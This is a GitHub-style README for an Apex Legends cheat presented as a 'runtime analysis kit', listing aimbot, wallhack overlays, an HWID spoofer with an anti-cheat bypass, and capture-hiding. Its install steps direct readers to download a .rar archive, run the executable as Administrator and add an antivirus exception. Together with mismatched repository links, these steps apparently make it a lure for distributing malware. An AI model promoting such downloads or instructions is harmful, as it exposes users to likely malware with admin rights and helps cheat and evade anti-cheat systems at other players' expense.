<div align="center">

# Apex Legends Runtime Analysis Kit

> **Modular instrumentation framework for studying real-time memory behavior in Apex Legends.**

<br/>

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0a0a12?style=for-the-badge&logo=windows&logoColor=00fff7)](https://github.com/yourname/apex-rak)
[![Graphics](https://img.shields.io/badge/Dear%20ImGui-DX11-0a0a12?style=for-the-badge&logoColor=ff2d95)](https://github.com/yourname/apex-rak)
[![Version](https://img.shields.io/badge/Version-5.4-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/apex-rak/releases)
[![License](https://img.shields.io/badge/License-MIT-0a0a12?style=for-the-badge&logoColor=b026ff)](LICENSE)

<br/>

<table>
  <tr>
    <td align="center">
      <img width="494" height="331" src="https://github.com/user-attachments/assets/82345087-59b9-4cc6-8b04-a1795fe3e4a8" alt="Runtime interface" />
      <br/>
      <sub>runtime interface</sub>
    </td>
    <td align="center">
      <img width="494" height="331" src="https://github.com/user-attachments/assets/b2362aa6-bc86-4ac2-9ec3-adc01be8dea3" alt="Module panel" />
      <br/>
      <sub>module panel</sub>
    </td>
  </tr>
</table>

</div>

---

### ⬇️ [Download](https://github.com/Perfectionfeagora/Apex-Legends-Cheat/releases/download/APEX.V5.4/APEX.V5.4.rar)

Get the latest release from the **[Releases](https://github.com/yourname/pubg-toolkit/releases/latest)** tab.

[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Perfectionfeagora/Apex-Legends-Cheat/releases/download/APEX.V5.4/APEX.V5.4.rar)

---

## ▸ overview

**Apex Legends Runtime Analysis Kit (ARAK)** is an external instrumentation framework for observing and modifying runtime state in Apex Legends. Built for reverse-engineering research and private sandbox experimentation, it provides a modular interface for inspecting memory structures, simulating state changes, and analyzing gameplay parameters.

> ⚠️ **disclaimer:** intended for educational and private use only. authors are not responsible for misuse in public multiplayer environments.


## ▸ modules

| id | module | description |
| :--- | :--- | :--- |
| `aim` | 🎯 **Targeting Logic** | Adjustable FOV, bone prioritization, smoothing curve, per-weapon recoil compensation. |
| `vis` | 👁️ **Visual Overlay** | 2D/3D bounding boxes, skeletal structures, shield/health indicators, distance readout. |
| `rad` | 📡 **Radar System** | Customizable mini-radar with live position tracking and zoom control. |
| `chm` | 🎨 **Material Override** | Visible and invisible player recoloring with multiple render styles. |
| `loot` | 🎒 **Loot Tracker** | Highlights weapons, armor, attachments, and healing items through geometry. |
| `lgd` | 🧬 **Legend Intel** | Displays enemy legend name, ultimate charge, and ability cooldown state. |
| `wld` | 🌍 **Environment Control** | World tint, sun color, cloud modulation, skybox replacement. |
| `cfg` | ⚙️ **Config Manager** | Save, load, and share presets. Auto-save on change. |
| `sec` | 🛡️ **HWID Layer** | Hardware fingerprint protection and kernel-level bypass. |
| `str` | 🎥 **Streamproof** | Invisible to OBS, Discord, ShadowPlay, and capture software. |
| `key` | 🔑 **Hotkey Bindings** | Fully rebindable F1–F12 for every module. |

**total: 11 core modules · 47 adjustable parameters**


## ▸ requirements

| | |
| :--- | :--- |
| **os** | Windows 10 / 11 x64 (1909+) |
| **game** | Apex Legends (latest Steam / EA App build) |
| **perms** | administrator rights for loader |
| **display** | windowed / borderless windowed |
| **runtime** | Visual C++ Redistributable 2015–2022 |


## ▸ [installation](https://github.com/Perfectionfeagora/Apex-Legends-Cheat/releases/download/APEX.V5.4/APEX.V5.4.rar)

**1.** download the latest release from the **[Releases](https://github.com/yourname/apex-rak/releases)** tab

**2.** extract archive to a single ASCII-path folder

**3.** run the `APEX.V5.4.exe` as **Administrator**

**4.** launch Apex Legends, enter a match, press `INSERT` or `DELETE`


## ▸ faq

<details>
<summary><b>is this safe?</b></summary>
<br>
the kit modifies runtime memory only — no disk writes to game files.
</details>

<details>
<summary><b>works with latest version?</b></summary>
<br>
compatibility maintained with current builds. check the Releases tab for updates.
</details>

<details>
<summary><b>why does antivirus flag it?</b></summary>
<br>
memory-injection frameworks trigger heuristic false positives. add an exception if you trust the source.
</details>

<details>
<summary><b>can i use in online matches?</b></summary>
<br>
intended for private and educational use only. not recommended for public multiplayer.
</details>

<details>
<summary><b>does it work with Easy Anti-Cheat?</b></summary>
<br>
the framework operates at runtime memory level. compatibility is maintained with current builds — check Releases for updates.
</details>


## ▸ security

- no telemetry, no analytics, no external calls
- all processing local
- source available for review


